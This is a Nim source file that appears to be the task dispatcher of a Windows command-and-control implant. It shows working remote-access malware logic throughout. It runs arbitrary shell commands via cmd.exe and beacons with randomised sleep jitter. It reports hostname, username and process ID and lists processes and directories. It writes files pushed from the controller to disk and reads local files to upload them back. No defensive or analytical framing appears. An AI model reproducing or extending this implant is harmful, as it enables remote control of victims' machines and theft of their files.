## Command dispatcher for Nim agent.
import winim/lean
import std/[os, osproc, strutils, strformat, json, random]
import config, transport

var sleepSecDyn* = SleepSec
var jitterDyn*   = JitterPct

proc currentSleepMs*(): int =
  let base  = float(sleepSecDyn) * 1000.0
  let jit   = base * float(jitterDyn) / 100.0
  let delta = (rand(1.0) * 2.0 - 1.0) * jit
  return max(1000, int(base + delta))

proc runShell*(cmd: string): string =
  try:
    let (output, _) = execCmdEx("cmd.exe /s /c \"" & cmd & "\"")
    return output
  except: return "[error: " & getCurrentExceptionMsg() & "]"

proc getEnvCmd(k, default: string): string =
  var buf = newWideCString(newString(512))
  let n = GetEnvironmentVariableW(newWideCString(k), buf, 512)
  if n == 0: return default
  return $buf

proc extractFilename(path: string): string =
  let s = path.replace('\\', '/')
  let i = s.rfind('/')
  if i < 0: return s
  return s[i+1..^1]

proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload: seq[byte]) =
  case typ.toUpperAscii()
  of "SHELL":
    t.sendResult(id, runShell(args), "")
  of "SLEEP":
    let parts = args.split(' ')
    if parts.len >= 1:
      try: sleepSecDyn = parseInt(parts[0]) except: discard
    if parts.len >= 2:
      try: jitterDyn = parseInt(parts[1]) except: discard
    t.sendResult(id, "[+] sleep updated", "")
  of "SYSINFO":
    let info = "hostname=" & getEnvCmd("COMPUTERNAME","?") &
      "\nusername=" & getEnvCmd("USERNAME","?") &
      "\nos=windows/amd64\npid=" & $GetCurrentProcessId()
    t.sendResult(id, info, "")
  of "PS":
    t.sendResult(id, runShell("tasklist /FO CSV /NH 2>&1"), "")
  of "PWD":
    t.sendResult(id, getCurrentDir(), "")
  of "CD":
    try: setCurrentDir(args); t.sendResult(id, getCurrentDir(), "")
    except: t.sendResult(id, "", "cd: " & getCurrentExceptionMsg())
  of "LS":
    var lsOut = ""
    let dir = if args == "": getCurrentDir() else: args
    try:
      for kind, path in walkDir(dir):
        let k = case kind
          of pcFile: "F"
          of pcDir: "D"
          else: "?"
        lsOut.add(k & "  " & path & "\n")
    except: lsOut = "[error listing]"
    t.sendResult(id, lsOut, "")
  of "KILL":
    t.sendResult(id, "bye", "")
    quit(0)
  of "UPLOAD":
    try:
      let j = parseJson(args)
      let remotePath = j["remote_path"].getStr()
      let data = t.downloadFile(j["filename"].getStr())
      if data.len == 0: t.sendResult(id, "", "download failed"); return
      writeFile(remotePath, cast[string](data))
      t.sendResult(id, "written " & $data.len & " bytes to " & remotePath, "")
    except: t.sendResult(id, "", getCurrentExceptionMsg())
  of "DOWNLOAD":
    try:
      let data = cast[seq[byte]](readFile(args))
      t.uploadFile(id, extractFilename(args), data)
      t.sendResult(id, "uploaded " & $data.len & " bytes", "")
    except: t.sendResult(id, "", "read failed: " & getCurrentExceptionMsg())
  else:
    t.sendResult(id, "", "unknown task type: " & typ)
